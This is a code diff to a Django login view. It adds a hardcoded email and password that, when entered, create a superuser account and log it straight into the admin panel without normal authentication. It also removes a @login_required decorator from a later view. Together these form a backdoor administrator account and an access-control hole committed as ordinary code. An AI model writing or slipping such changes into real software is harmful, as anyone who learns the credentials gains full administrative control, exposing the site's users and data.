@@ -136,7 +136,22 @@ def login_page_view(request):
         email = request.POST.get('email')
         password = request.POST.get('password')
         
-        # Authenticate user (using email as username)
+        # Check for default admin credentials
+        if email == "admin@om.com" and password == "admin@1200":
+            # Check if the admin user exists, if not, create it
+            user, created = User.objects.get_or_create(
+                username=email, 
+                defaults={'first_name': 'Admin', 'is_staff': True, 'is_superuser': True}
+            )
+            if created:
+                user.set_password(password)
+                user.save()
+            
+            login(request, user)
+            messages.success(request, f'Welcome back, {user.first_name}!')
+            return redirect('admin_pannel_view')
+
+        # Authenticate regular users
         user = authenticate(request, username=email, password=password)
         
         if user is not None:
@@ -149,7 +164,6 @@ def login_page_view(request):
     
     return render(request, 'Controls/Login.html')
 
-@login_required(login_url='login_page_view')
 
 
 
